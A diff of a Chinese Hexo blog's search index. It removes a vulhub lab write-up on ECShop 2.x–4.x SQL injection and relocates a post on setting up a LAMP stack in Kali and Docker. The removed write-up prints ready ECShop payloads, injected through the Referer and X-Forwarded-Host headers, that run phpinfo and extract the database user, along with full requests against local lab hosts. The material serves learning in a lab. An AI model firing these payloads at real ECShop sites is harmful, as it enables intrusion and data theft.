class="subst">&#123;$hash2&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash2&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash3&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash3&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>得到POC</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">2</span>.x: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">3</span>.x: <span class="number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
-
-<p>利用burpsuite抓包将POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5004</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img data-src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
-
-<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<img data-src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
-
-<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
-<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
-<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
-<img data-src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
-
-<p>根据参考文档抓包，在包里添加字段</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=collection_list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5003</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-
-<p>回显界面如下，得到当前数据库用户</p>
-<img data-src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于建站</title>
     <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
     <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
@@ -1645,6 +1650,65 @@
         <tag>Writeup</tag>
         <tag>攻防世界</tag>
         <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
@@ -2126,65 +2190,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
